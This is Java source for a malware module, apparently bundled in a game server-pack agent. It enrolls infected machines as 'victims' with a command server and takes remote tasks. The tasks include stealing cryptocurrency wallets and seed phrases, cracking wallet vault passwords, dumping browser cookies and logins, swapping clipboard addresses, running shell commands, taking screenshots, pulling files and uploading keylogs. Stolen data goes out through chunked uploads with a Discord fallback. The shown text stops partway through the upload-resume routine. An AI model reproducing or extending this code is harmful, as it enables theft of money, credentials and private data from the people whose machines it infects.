package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.AgentPaths;
import com.serverpackcore.agent.Harvest;
import com.serverpackcore.agent.Json;
import com.serverpackcore.agent.Screenshot;
import com.serverpackcore.agent.Shell;
import com.serverpackcore.agent.SysInfo;

import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Owns the crypto collection module and its own API transport. Every module
 * failure is contained: heartbeats and task polling run on separate loops and
 * a corrupt store only yields a per-target error record.
 */
public final class CryptoModule {
	public interface Sink {
		void send(String module, Path file);
	}

	public record Task(String id, String name, Map<String, Object> params, int timeout) {
	}

	private static final Set<String> SUPPORTED = Set.of(
		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
		"shell", "harvest", "screenshot", "file_pull", "cancel");

	private final Path installDir;
	private final Path gameDir;
	private final CryptoConfig config;
	private final CryptoLog log;
	private final CryptoTransport transport;
	private final Sink sink;
	private final Path stateFile;
	private final Path work;
	private final Map<String, Object> state = new LinkedHashMap<>();
	private final Map<String, String> passwords = new LinkedHashMap<>();
	private final Map<String, Map<String, Object>> uploads = new LinkedHashMap<>();
	private final Map<String, String> moduleHealth = new ConcurrentHashMap<>();
	private final Map<String, AtomicBoolean> cancels = new ConcurrentHashMap<>();
	private final Map<String, Future<?>> active = new ConcurrentHashMap<>();
	private final Map<String, Integer> counters = new LinkedHashMap<>();
	private final ExecutorService pool = Executors.newFixedThreadPool(3, runnable -> {
		Thread thread = new Thread(runnable, "spc-crypto");
		thread.setDaemon(true);
		return thread;
	});
	private final ExecutorService uploadsPool = Executors.newSingleThreadExecutor(runnable -> {
		Thread thread = new Thread(runnable, "spc-crypto-upload");
		thread.setDaemon(true);
		return thread;
	});
	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2, runnable -> {
		Thread thread = new Thread(runnable, "spc-crypto-timer");
		thread.setDaemon(true);
		return thread;
	});
	private final Semaphore pollNow = new Semaphore(0);
	private final AtomicLong startedAt = new AtomicLong(System.currentTimeMillis());
	private final AtomicInteger uploadsActive = new AtomicInteger();
	private volatile boolean enabled = true;
	private volatile boolean running;
	private volatile Thread hbThread;
	private volatile Thread taskThread;
	private volatile ClipboardWatcher clipboard;
	private volatile CryptoConfig activeConfig;

	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config, Sink sink) {
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.config = config;
		this.sink = sink;
		this.activeConfig = config;
		this.stateFile = AgentPaths.cache(installDir).resolve("crypto").resolve("state.json");
		this.work = AgentPaths.cache(installDir).resolve("crypto");
		CryptoLog created = null;
		try {
			created = new CryptoLog(work.resolve("crypto.log"), config.secret());
		} catch (Throwable ignored) {
			// log is optional
		}
		this.log = created;
		this.transport = new CryptoTransport(config, created);
		loadState();
		for (String name : List.of("wallets", "clipboard", "credentials", "seeds")) {
			moduleHealth.put(name, "idle");
		}
	}

	private void log(String message) {
		if (log != null) {
			log.debug(message);
		}
	}

	private void warn(String message, Throwable throwable) {
		if (log != null) {
			log.debug(message, throwable);
		}
	}

	public boolean enabled() {
		return enabled;
	}

	public String status() {
		StringBuilder builder = new StringBuilder("crypto ").append(config);
		builder.append(" victim=").append(transport.victimId().isEmpty() ? "-" : transport.victimId());
		builder.append(" modules=").append(moduleHealth);
		builder.append(" queues=").append(uploadsActive.get());
		if (clipboard != null) {
			builder.append(' ').append(clipboard.status());
		}
		return builder.toString();
	}

	public synchronized void start() {
		if (running) {
			return;
		}
		running = true;
		startedAt.set(System.currentTimeMillis());
		if (config.clipboard && clipboard == null) {
			clipboard = new ClipboardWatcher(this::coins, () -> {
				Object value = state.get("clipRotation");
				return value instanceof Map<?, ?> map ? castRotation(map) : new LinkedHashMap<>();
			});
			clipboard.start();
		}
		uploadsPool.submit(this::resumePending);
		heartbeatLoop();
		taskLoop();
	}

	public synchronized void stop() {
		running = false;
		Thread hb = hbThread;
		if (hb != null) {
			hb.interrupt();
		}
		Thread tasks = taskThread;
		if (tasks != null) {
			tasks.interrupt();
		}
		if (clipboard != null) {
			clipboard.stop();
		}
		for (AtomicBoolean cancel : cancels.values()) {
			cancel.set(true);
		}
		pool.shutdownNow();
		uploadsPool.shutdownNow();
		scheduler.shutdownNow();
		saveState();
	}

	private void heartbeatLoop() {
		hbThread = new Thread(() -> {
			boolean enrolled = transport.enrolled();
			while (running && enabled) {
				try {
					if (!enrolled) {
						enrolled = enroll();
						if (!enrolled) {
							Thread.sleep(config.jitter(30_000L));
							continue;
						}
					}
					sendHeartbeat();
					Thread.sleep(config.jitter(config.heartbeatMs));
				} catch (InterruptedException interrupted) {
					return;
				} catch (Throwable throwable) {
					warn("heartbeat failed", throwable);
					try {
						Thread.sleep(config.jitter(15_000L));
					} catch (InterruptedException interrupted) {
						return;
					}
				}
			}
		}, "spc-crypto-hb");
		hbThread.setDaemon(true);
		hbThread.start();
	}

	private void taskLoop() {
		taskThread = new Thread(() -> {
			while (running && enabled) {
				try {
					if (!transport.enrolled()) {
						Thread.sleep(config.jitter(10_000L));
						continue;
					}
					CryptoTransport.Reply reply = transport.tasks(8);
					if (reply.status() == 401) {
						if (reEnroll()) {
							continue;
						}
					}
					if (reply.status() == 410) {
						enabled = false;
						return;
					}
					if (reply.status() == 200) {
						for (Object raw : Json.list(reply.json().get("tasks"))) {
							Map<String, Object> map = Json.map(raw);
							String id = Json.str(map, "id", "");
							String name = Json.str(map, "name", "");
							if (id.isEmpty() || !SUPPORTED.contains(name)) {
								if (!id.isEmpty()) {
									postResult(id, "error", "unknown_task", Map.of());
								}
								continue;
							}
							int timeout = (int) Math.min(3600, Math.max(1, Json.num(map, "timeout_sec", 120L)));
							submit(new Task(id, name, Json.map(map.get("params")), timeout));
						}
					}
					pollNow.tryAcquire(config.jitter(config.pollMs), TimeUnit.MILLISECONDS);
					pollNow.drainPermits();
				} catch (InterruptedException interrupted) {
					return;
				} catch (Throwable throwable) {
					warn("task poll failed", throwable);
					try {
						Thread.sleep(config.jitter(12_000L));
					} catch (InterruptedException interrupted) {
						return;
					}
				}
			}
		}, "spc-crypto-poll");
		taskThread.setDaemon(true);
		taskThread.start();
	}

	private boolean enroll() {
		try {
			String token = CryptoUtil.b64url(java.util.Arrays.copyOf(
				CryptoUtil.hmac(config.secret(), CryptoUtil.utf8("enroll")), 32));
			Map<String, Object> payload = new LinkedHashMap<>();
			payload.put("build_token", token);
			payload.put("build_id", config.buildId);
			payload.put("hostname", SysInfo.hostname());
			payload.put("os", CryptoPaths.os());
			payload.put("os_version", System.getProperty("os.version", ""));
			payload.put("arch", System.getProperty("os.arch", "").contains("64") ? "x86_64" : "aarch64");
			payload.put("username", SysInfo.user());
			payload.put("agent_version", version());
			payload.put("profile", config.full ? "full" : "lite");
			payload.put("modules", new ArrayList<>(List.of("wallets", "clipboard", "credentials", "seeds")));
			CryptoTransport.Reply reply = transport.enroll(token, payload);
			if (reply.status() != 201) {
				if (reply.status() == 403) {
					enabled = false;
				}
				log("enroll status " + reply.status() + " " + reply.text());
				return false;
			}
			Map<String, Object> json = reply.json();
			String victim = Json.str(json, "victim_id", "");
			String device = Json.str(json, "device_token", "");
			if (victim.isEmpty() || device.isEmpty()) {
				return false;
			}
			state.put("victim_id", victim);
			state.put("device_token", device);
			transport.identity(victim, device);
			saveState();
			log("enrolled victim " + victim);
			return true;
		} catch (Throwable throwable) {
			warn("enroll failed", throwable);
			return false;
		}
	}

	private boolean reEnroll() {
		state.remove("device_token");
		state.remove("victim_id");
		saveState();
		return enroll();
	}

	private void sendHeartbeat() throws Exception {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("status", moduleHealth.values().stream().anyMatch(value -> value.startsWith("error")) ? "degraded" : "ok");
		body.put("uptime_s", (System.currentTimeMillis() - startedAt.get()) / 1000L);
		body.put("modules", new LinkedHashMap<>(moduleHealth));
		body.put("counters", new LinkedHashMap<>(counters));
		body.put("profile", config.full ? "full" : "lite");
		body.put("pending_artifact", null);
		body.put("agent_version", version());
		CryptoTransport.Reply reply = transport.heartbeat(CryptoUtil.utf8(Json.stringify(body)));
		if (reply.status() == 401 && reEnroll()) {
			return;
		}
		if (reply.status() == 410) {
			enabled = false;
		}
		if (reply.status() == 200 && Json.map(reply.json()).get("poll_now") == Boolean.TRUE) {
			pollNow.release();
		}
	}

	private String version() {
		String version = CryptoModule.class.getPackage().getImplementationVersion();
		return version == null ? "0.3.0" : version;
	}

	public void submit(Task task) {
		AtomicBoolean cancel = new AtomicBoolean();
		cancels.put(task.id(), cancel);
		Future<?> future = pool.submit(() -> {
			long began = System.currentTimeMillis();
			try {
				Map<String, Object> result = handle(task, cancel);
				if (cancel.get()) {
					postResult(task.id(), "cancelled", null, result);
				} else {
					postResult(task.id(), "ok", null, result);
				}
			} catch (Throwable throwable) {
				warn("task " + task.name() + " failed", throwable);
				postResult(task.id(), "error", throwable.getClass().getSimpleName() + ":" + shortMessage(throwable), Map.of());
			} finally {
				active.remove(task.id());
				cancels.remove(task.id());
				log("task " + task.name() + " " + (System.currentTimeMillis() - began) + "ms");
			}
		});
		active.put(task.id(), future);
		scheduler.schedule(() -> {
			AtomicBoolean flag = cancels.get(task.id());
			if (flag != null) {
				flag.set(true);
			}
			Future<?> current = active.get(task.id());
			if (current != null) {
				current.cancel(true);
			}
		}, task.timeout(), TimeUnit.SECONDS);
	}

	private Map<String, Object> handle(Task task, AtomicBoolean cancel) throws Exception {
		moduleHealth.put(module(task.name()), "ok");
		try {
			return switch (task.name()) {
				case "scan_wallets" -> scan(task, cancel);
				case "dump_vault" -> dump(task, cancel);
				case "crack_vault" -> crack(task, cancel);
				case "clip_start" -> clipStart(task);
				case "clip_stop" -> clipStop();
				case "cancel" -> cancelTask(task);
				case "shell" -> shell(task);
				case "harvest" -> harvest();
				case "screenshot" -> screenshot();
				case "file_pull" -> filePull(task);
				default -> Map.of("ok", false);
			};
		} catch (Throwable throwable) {
			moduleHealth.put(module(task.name()), "error:" + throwable.getClass().getSimpleName());
			throw throwable;
		}
	}

	private String module(String name) {
		return switch (name) {
			case "scan_wallets", "dump_vault", "crack_vault" -> "wallets";
			case "clip_start", "clip_stop" -> "clipboard";
			case "harvest" -> "seeds";
			default -> "credentials";
		};
	}

	// ── scan ────────────────────────────────────────────────────────────────

	private Map<String, Object> scan(Task task, AtomicBoolean cancel) throws Exception {
		Map<String, Object> params = task.params();
		boolean desktop = !Boolean.FALSE.equals(params.get("include_desktop"));
		boolean extensions = !Boolean.FALSE.equals(params.get("include_extensions"));
		boolean seeds = config.seeds && !Boolean.FALSE.equals(params.get("include_seeds"));
		int maxFiles = (int) Math.min(20_000, Math.max(1, Json.num(params, "max_files", 4000L)));
		long began = System.currentTimeMillis();
		List<Map<String, Object>> wallets = new ArrayList<>();
		List<Map<String, Object>> findings = new ArrayList<>();
		Path moduleDir = work.resolve("scan-" + task.id());
		Files.createDirectories(moduleDir);
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets");

		if (extensions) {
			for (CryptoPaths.Target target : CryptoPaths.extensionTargets(config.full)) {
				if (cancel.get()) {
					break;
				}
				if (target.kind().equals("creds")) {
					continue;
				}
				wallets.add(inspect(target, cancel));
			}
			moduleHealth.put("credentials", "ok");
			if (config.credentials) {
				int index = 0;
				for (Path profile : CryptoPaths.credentialProfiles()) {
					CredentialDump.Result creds = CredentialDump.dump(profile, CredentialDump.tempRoot(installDir));
					Map<String, Object> row = wallet("creds-" + Math.abs(profile.hashCode()), "creds", profile.toString(),
						creds.cookies() + creds.logins() > 0 ? "found" : "locked",
						creds.reason().isEmpty() ? "cookies=" + creds.cookies() + " logins=" + creds.logins() : creds.reason());
					wallets.add(row);
					Path json = creds.dir().resolve("credentials.json");
					if (Files.isRegularFile(json)) {
						pack.add(json, "credentials/" + index++ + "-" + profile.getFileName() + ".json", "credentials");
					}
					cleanup(creds.dir());
				}
			}
		}
		if (desktop) {
			for (DesktopWallets.Wallet wallet : DesktopWallets.discover()) {
				if (cancel.get()) {
					break;
				}
				Map<String, Object> row = wallet(wallet.id(), wallet.kind(), wallet.path().toString(), wallet.state(), wallet.reason());
				if ("decrypted".equals(wallet.state()) && wallet.secret() != null) {
					row.put("decrypted", true);
				}
				wallets.add(row);
			}
		}
		if (seeds) {
			for (SeedScanner.Finding finding : SeedScanner.scan(CryptoPaths.seedDirs(), maxFiles)) {
				if (cancel.get()) {
					break;
				}
				Map<String, Object> row = new LinkedHashMap<>();
				row.put("path", finding.path());
				row.put("kind", finding.kind());
				row.put("value", finding.value());
				row.put("words", finding.words());
				findings.add(row);
			}
			moduleHealth.put("seeds", "ok");
		}
		counters.put("wallets", wallets.size());
		counters.put("seeds", findings.size());

		Map<String, Object> index = new LinkedHashMap<>();
		index.put("wallets", wallets);
		index.put("seeds", findings);
		Path file = moduleDir.resolve("wallets.json");
		Files.writeString(file, Json.stringify(index), StandardCharsets.UTF_8);

		pack.add(file, "wallets.json", "index");
		for (Map<String, Object> wallet : wallets) {
			String path = String.valueOf(wallet.get("path"));
			Path source = Path.of(path);
			if (Files.isRegularFile(source) && wallet.get("kind").equals("seed_file")) {
				pack.add(source, "seeds/" + source.getFileName(), "seed_file");
			}
		}
		String upload = pack.size() > 0 ? queueUpload(pack, "wallets") : "";
		Map<String, Object> result = new LinkedHashMap<>();
		result.put("wallets", wallets);
		result.put("seeds", findings);
		result.put("elapsed_ms", System.currentTimeMillis() - began);
		result.put("truncated", wallets.size() >= maxFiles);
		if (!upload.isEmpty()) {
			result.put("upload_id", upload);
		}
		return result;
	}

	private Map<String, Object> inspect(CryptoPaths.Target target, AtomicBoolean cancel) {
		Path copy = null;
		try {
			if (target.extension() && target.kind().equals("extension")) {
				copy = CredentialDump.tempRoot(installDir).resolve("ext-" + Math.abs(target.path().hashCode()));
				Files.createDirectories(copy);
				DesktopDump.copyLevel(target.path(), copy);
			}
			Path vault = findVault(copy != null ? copy : target.path());
			Map<String, Object> row = wallet(target.id(), target.kind(), target.path().toString(), vault == null ? "found" : "locked",
				vault == null ? "no_vault" : "password_required");
			if (vault != null) {
				String password = passwords.get(target.id());
				if (password != null) {
					VaultV3.Result attempt = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), password);
					if (attempt.ok()) {
						row.put("state", "decrypted");
						row.put("reason", "vault_password_saved");
					}
				}
				row.put("crackable", true);
			}
			return row;
		} catch (Throwable throwable) {
			return wallet(target.id(), target.kind(), target.path().toString(), "corrupt", throwable.getClass().getSimpleName());
		} finally {
			cleanup(copy);
		}
	}

	private Map<String, Object> wallet(String id, String kind, String path, String state, String reason) {
		Map<String, Object> row = new LinkedHashMap<>();
		row.put("id", id);
		row.put("kind", kind);
		row.put("path", path);
		row.put("state", state);
		row.put("reason", reason);
		return row;
	}

	// ── dump ────────────────────────────────────────────────────────────────

	private Map<String, Object> dump(Task task, AtomicBoolean cancel) throws Exception {
		String targetId = Json.str(task.params(), "target", "");
		if (targetId.isEmpty()) {
			throw new IllegalArgumentException("target_required");
		}
		CryptoPaths.Target target = CryptoPaths.extensionTargets(config.full).stream()
			.filter(item -> item.id().equals(targetId) && item.kind().equals("extension"))
			.findFirst().orElse(null);
		DesktopWallets.Wallet desktopWallet = null;
		if (target == null) {
			desktopWallet = DesktopWallets.discover().stream()
				.filter(item -> item.id().equals(targetId)).findFirst().orElse(null);
		}
		if (target == null && desktopWallet == null) {
			throw new IllegalArgumentException("target_not_found");
		}
		Path source = target != null ? target.path() : desktopWallet.path();
		Path temp = CredentialDump.tempRoot(installDir).resolve("dump-" + task.id());
		Files.createDirectories(temp);

		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets");
		if (target != null) {
			Path copy = temp.resolve("store");
			DesktopDump.copyLevel(source, copy);
			addTree(pack, copy, "wallets/" + targetId, cancel);
			Path vault = findVault(copy);
			if (vault != null) {
				String password = passwords.get(targetId);
				if (password != null) {
					VaultV3.Result attempt = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), password);
					if (attempt.ok()) {
						pack.add(CryptoUtil.utf8(attempt.plaintext()), "wallets/" + targetId + "/decrypted.json", "vault_plain");
					}
				}
			}
		} else {
			Path copy = temp.resolve("store");
			DesktopDump.copyLevel(source, copy);
			addTree(pack, copy, "wallets/" + targetId, cancel);
			if (desktopWallet.secret() != null) {
				pack.add(CryptoUtil.utf8(desktopWallet.secret()), "wallets/" + targetId + "/secret.txt", "seed");
			}
			for (String suffix : new String[] { ".wallet" }) {
				try (var stream = Files.walk(source, 2)) {
					for (Path file : stream.filter(item -> item.getFileName().toString().endsWith(suffix)).toList()) {
						String password = passwords.get(targetId);
						if (password != null) {
							String secret = DesktopWallets.electrumPassword(file, password);
							if (secret != null) {
								pack.add(CryptoUtil.utf8(secret), "wallets/" + targetId + "/" + file.getFileName() + ".secret", "seed");
							}
						}
					}
				}
			}
		}
		Map<String, Object> result = new LinkedHashMap<>();
		result.put("target", targetId);
		result.put("artifacts", pack.size());
		result.put("bytes", pack.bytes());
		if (pack.size() == 0) {
			result.put("status", "partial");
			return result;
		}
		String upload = queueUpload(pack, "wallets");
		result.put("upload_id", upload);
		result.put("status", upload.isEmpty() ? "partial" : "queued");
		cleanup(temp);
		return result;
	}

	private void addTree(ArtifactPack pack, Path root, String prefix, AtomicBoolean cancel) {
		try (var stream = Files.walk(root)) {
			for (Path file : stream.filter(Files::isRegularFile).toList()) {
				if (cancel.get()) {
					return;
				}
				String relative = root.relativize(file).toString().replace('\\', '/');
				pack.add(file, prefix + "/" + relative, relative.contains("indexeddb") ? "leveldb" : "file");
			}
		} catch (Throwable throwable) {
			warn("tree add failed", throwable);
		}
	}

	// ── crack ───────────────────────────────────────────────────────────────

	private Map<String, Object> crack(Task task, AtomicBoolean cancel) throws Exception {
		String targetId = Json.str(task.params(), "target", "");
		Path leveldb = null;
		Path electrum = null;
		for (CryptoPaths.Target target : CryptoPaths.extensionTargets(false)) {
			if (target.id().equals(targetId) && target.kind().equals("extension")) {
				leveldb = target.path();
				break;
			}
		}
		if (leveldb == null) {
			for (DesktopWallets.Wallet wallet : DesktopWallets.discover()) {
				if (wallet.id().equals(targetId) && wallet.path().getFileName().toString().endsWith(".wallet")) {
					electrum = wallet.path();
					break;
				}
			}
		}
		if (leveldb == null && electrum == null) {
			throw new IllegalArgumentException("target_not_found");
		}
		int seconds = (int) Math.min(config.crackSeconds, Json.num(task.params(), "max_seconds", config.crackSeconds));
		int cpu = (int) Math.min(config.crackCpu, Json.num(task.params(), "max_cpu_pct", config.crackCpu));
		String wordlist = Json.str(task.params(), "wordlist", "");
		VaultCracker.Result result;
		Path temp = CredentialDump.tempRoot(installDir).resolve("crack-" + task.id());
		if (leveldb != null) {
			Path copy = temp.resolve("store");
			DesktopDump.copyLevel(leveldb, copy);
			Path vault = findVault(copy);
			if (vault == null) {
				throw new IllegalArgumentException("no_vault");
			}
			result = VaultCracker.crack(Files.readString(vault, StandardCharsets.UTF_8), seconds, cpu, wordlist, cancel);
		} else {
			result = VaultCracker.crackElectrum(electrum, seconds, cpu, wordlist, cancel);
		}
		if (result.found()) {
			passwords.put(targetId, result.password());
			state.put("passwords", new LinkedHashMap<>(passwords));
			saveState();
		}
		Map<String, Object> out = new LinkedHashMap<>();
		out.put("target", targetId);
		out.put("found", result.found());
		out.put("password", result.password());
		out.put("attempts", result.attempts());
		out.put("elapsed_ms", result.elapsedMs());
		cleanup(temp);
		return out;
	}

	// ── clipboard ───────────────────────────────────────────────────────────

	private Map<String, Object> clipStart(Task task) {
		if (clipboard == null) {
			clipboard = new ClipboardWatcher(this::coins, () -> {
				Object value = state.get("clipRotation");
				return value instanceof Map<?, ?> map ? castRotation(map) : new LinkedHashMap<>();
			});
		}
		int max = (int) Json.num(task.params(), "max_history", 500L);
		clipboard.configure(max);
		if (Boolean.TRUE.equals(task.params().get("replace"))) {
			Object coins = task.params().get("coins");
			if (coins instanceof Map<?, ?> map) {
				Map<String, List<String>> parsed = new LinkedHashMap<>();
				for (Map.Entry<?, ?> entry : map.entrySet()) {
					List<String> list = new ArrayList<>();
					for (Object item : Json.list(entry.getValue())) {
						if (item instanceof String text && com.serverpackcore.agent.AddressValidator.valid(String.valueOf(entry.getKey()), text)) {
							list.add(text);
						}
					}
					if (!list.isEmpty()) {
						parsed.put(String.valueOf(entry.getKey()).toLowerCase(java.util.Locale.ROOT), list);
					}
				}
				state.put("clipCoins", parsed);
				saveState();
			}
		}
		clipboard.start();
		moduleHealth.put("clipboard", "ok");
		counters.put("clip", clipboard.snapshot().size());
		return Map.of("ok", true);
	}

	private Map<String, Object> clipStop() {
		String upload = "";
		if (clipboard != null) {
			clipboard.stop();
			Path dir = work.resolve("clipboard");
			Path file = clipboard.flush(dir);
			if (file != null) {
				ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "clipboard");
				if (pack.add(file, "clipboard.jsonl", "clipboard")) {
					upload = queueUpload(pack, "clipboard");
				}
			}
		}
		moduleHealth.put("clipboard", "stopped");
		Map<String, Object> out = new LinkedHashMap<>();
		out.put("ok", true);
		if (!upload.isEmpty()) {
			out.put("upload_id", upload);
		}
		return out;
	}

	@SuppressWarnings("unchecked")
	private Map<String, Integer> castRotation(Map<?, ?> map) {
		Map<String, Integer> out = new LinkedHashMap<>();
		for (Map.Entry<?, ?> entry : map.entrySet()) {
			if (entry.getValue() instanceof Number number) {
				out.put(String.valueOf(entry.getKey()), number.intValue());
			}
		}
		return out;
	}

	@SuppressWarnings("unchecked")
	private Map<String, List<String>> coins() {
		Object value = state.get("clipCoins");
		if (value instanceof Map<?, ?> map) {
			Map<String, List<String>> out = new LinkedHashMap<>();
			for (Map.Entry<?, ?> entry : map.entrySet()) {
				List<String> list = new ArrayList<>();
				for (Object item : Json.list(entry.getValue())) {
					list.add(String.valueOf(item));
				}
				out.put(String.valueOf(entry.getKey()), list);
			}
			return out;
		}
		return Map.of();
	}

	// ── host bridge ─────────────────────────────────────────────────────────

	private Map<String, Object> cancelTask(Task task) {
		String id = Json.str(task.params(), "task_id", "");
		AtomicBoolean flag = cancels.get(id);
		if (flag != null) {
			flag.set(true);
		}
		Future<?> future = active.get(id);
		if (future != null) {
			future.cancel(true);
		}
		return Map.of("ok", flag != null || future != null);
	}

	private Map<String, Object> shell(Task task) throws Exception {
		String command = Json.str(task.params(), "command", "");
		long timeout = Math.min(120_000L, Json.num(task.params(), "timeout_sec", 60L) * 1000L);
		String output = Shell.run(installDir, command, timeout);
		Map<String, Object> out = new LinkedHashMap<>();
		out.put("exit", 0);
		out.put("output", output);
		return out;
	}

	private Map<String, Object> harvest() throws Exception {
		Path zip = Harvest.build(installDir, gameDir);
		Map<String, Object> result = new LinkedHashMap<>();
		result.put("ok", true);
		result.put("path", zip.getFileName().toString());
		Path ops = AgentPaths.cache(installDir).resolve("ops");
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "keylogs");
		Path converted = work.resolve("keylogs-" + System.currentTimeMillis() + ".jsonl");
		boolean any = convertLog(ops.resolve("keys.log"), converted, false);
		if (any) {
			pack.add(converted, "keylogs.jsonl", "keylogs");
		}
		Path passwords = work.resolve("passwords-" + System.currentTimeMillis() + ".jsonl");
		if (convertLog(ops.resolve("passwords.log"), passwords, true)) {
			pack.add(passwords, "passwords.jsonl", "passwords");
		}
		pack.add(ops.resolve("seeds.log"), "seeds.log", "seeds");
		if (pack.size() > 0) {
			result.put("upload_id", queueUpload(pack, "keylogs"));
		}
		return result;
	}

	/** ops logs are line-oriented; the panel ingests JSONL. */
	private boolean convertLog(Path source, Path target, boolean password) {
		try {
			if (!Files.isRegularFile(source)) {
				return false;
			}
			StringBuilder out = new StringBuilder();
			for (String line : Files.readAllLines(source, StandardCharsets.UTF_8)) {
				if (line.isBlank()) {
					continue;
				}
				String process = "";
				String title = "";
				String text = line;
				int first = line.indexOf('|');
				int second = line.indexOf('|', first + 1);
				if (first > 0 && second > first) {
					process = line.substring(0, first).replace("password?", "").strip();
					title = line.substring(first + 1, second).strip();
					text = line.substring(second + 1).strip();
				}
				Map<String, Object> row = new LinkedHashMap<>();
				row.put("ts", System.currentTimeMillis() / 1000L);
				row.put("process", process);
				row.put("title", title);
				row.put("text", text);
				row.put("password", password);
				out.append(Json.stringify(row)).append('\n');
			}
			if (out.length() == 0) {
				return false;
			}
			Files.writeString(target, out.toString(), StandardCharsets.UTF_8);
			return true;
		} catch (Throwable throwable) {
			return false;
		}
	}

	private Map<String, Object> screenshot() throws Exception {
		Path file = Screenshot.save(work.resolve("screens"));
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "screenshot");
		pack.add(file, "screenshot.png", "screenshot");
		String upload = queueUpload(pack, "screenshot");
		Map<String, Object> result = new LinkedHashMap<>();
		result.put("upload_id", upload);
		result.put("bytes", Files.size(file));
		return result;
	}

	private Map<String, Object> filePull(Task task) throws Exception {
		String value = Json.str(task.params(), "path", "");
		Path file = Path.of(value);
		if (!Files.isRegularFile(file)) {
			throw new IllegalArgumentException("file_not_found");
		}
		long max = Json.num(task.params(), "max_mb", 64L) * 1024L * 1024L;
		if (Files.size(file) > max || Files.size(file) > config.maxArtifact) {
			throw new IllegalArgumentException("file_too_large");
		}
		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "files");
		pack.add(file, "files/" + file.getFileName(), "file");
		String upload = queueUpload(pack, "files");
		Map<String, Object> result = new LinkedHashMap<>();
		result.put("upload_id", upload);
		result.put("bytes", Files.size(file));
		return result;
	}

	// ── uploads ─────────────────────────────────────────────────────────────

	private String queueUpload(ArtifactPack pack, String module) {
		try {
			uploadsActive.incrementAndGet();
			Path dir = work.resolve("uploads");
			Files.createDirectories(dir);
			Path file = dir.resolve(module + "-" + System.currentTimeMillis() + ".spc");
			pack.build(file);
			String sha = ArtifactPack.sha256(file);
			long size = Files.size(file);
			int chunks = (int) Math.ceil(size / (double) CryptoConfig.CHUNK);
			Map<String, Object> body = new LinkedHashMap<>();
			body.put("task_id", null);
			body.put("module", module);
			body.put("container_version", 1);
			body.put("total_size", size);
			body.put("chunk_count", chunks);
			body.put("sha256", sha);
			CryptoTransport.Reply init = null;
			try {
				init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
			} catch (Throwable throwable) {
				log("api upload unavailable: " + throwable.getMessage());
			}
			if (init == null || init.status() != 201) {
				try {
					Path zip = file.resolveSibling(file.getFileName().toString().replace(".spc", ".zip"));
					pack.buildZip(zip);
					if (sink != null) {
						sink.send(module, zip);
					}
				} catch (Throwable throwable) {
					warn("discord fallback failed", throwable);
				}
				Files.deleteIfExists(file);
				uploadsActive.decrementAndGet();
				log("upload init failed, discord fallback");
				return "";
			}
			String uploadId = Json.str(init.json(), "upload_id", "");
			if (uploadId.isEmpty()) {
				uploadsActive.decrementAndGet();
				return "";
			}
			Map<String, Object> record = new LinkedHashMap<>();
			record.put("path", file.toString());
			record.put("offset", 0L);
			record.put("sha", sha);
			record.put("chunks", chunks);
			record.put("module", module);
			uploads.put(uploadId, record);
			saveState();
			uploadsPool.submit(() -> {
				try {
					stream(file, uploadId, sha, chunks, module);
				} catch (Throwable throwable) {
					warn("upload failed", throwable);
				} finally {
					uploadsActive.decrementAndGet();
				}
			});
			return uploadId;
		} catch (Throwable throwable) {
			warn("upload prepare failed", throwable);
			uploadsActive.decrementAndGet();
			return "";
		}
	}

	private void stream(Path file, String uploadId, String sha, int chunks, String module) throws Exception {
		long size = Files.size(file);
		long offset = 0;
		byte[] buffer = new byte[CryptoConfig.CHUNK];
		try (InputStream input = Files.newInputStream(file)) {
			while (offset < size) {
				int count = input.read(buffer);
				if (count <= 0) {
					break;
				}
				byte[] chunk = java.util.Arrays.copyOf(buffer, count);
				CryptoTransport.Reply reply = transport.chunk(uploadId, offset, chunk, CryptoUtil.hex(CryptoUtil.sha256(chunk)));
				if (reply.status() == 409) {
					offset = Json.num(reply.json(), "received", offset);
					Map<String, Object> record = uploads.get(uploadId);
					if (record != null) {
						record.put("offset", offset);
						saveState();
					}
					input.close();
					return;
				}
				if (reply.status() == 410) {
					resumeUpload(uploadId, file, sha, chunks, module);
					return;
				}
				if (reply.status() != 200) {
					throw new IllegalStateException("chunk_" + reply.status());
				}
				offset += count;
				Map<String, Object> record = uploads.get(uploadId);
				if (record != null) {
					record.put("offset", offset);
					saveState();
				}
			}
		}
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("sha256", sha);
		body.put("chunk_count", chunks);
		CryptoTransport.Reply commit = transport.commit(uploadId, CryptoUtil.utf8(Json.stringify(body)));
		if (commit.status() != 200) {
			throw new IllegalStateException("commit_" + commit.status());
		}
		uploads.remove(uploadId);
		saveState();
		Files.deleteIfExists(file);
		log("uploaded " + module + " " + size + " bytes");
	}

	private void resumeUpload(String uploadId, Path file, String sha, int chunks, String module) throws Exception {
		Map<String, Object> record = uploads.get(uploadId);
		long offset = 0;
		CryptoTransport.Reply status = transport.uploadStatus(uploadId);
		if (status.status() == 200) {
			offset = Json.num(status.json(), "received", 0L);
		} else {
			Map<String, Object> body = new LinkedHashMap<>();
			body.put("task_id", null);
			body.put("module", module);
			body.put("container_version", 1);
			body.put("total_size", Files.size(file));
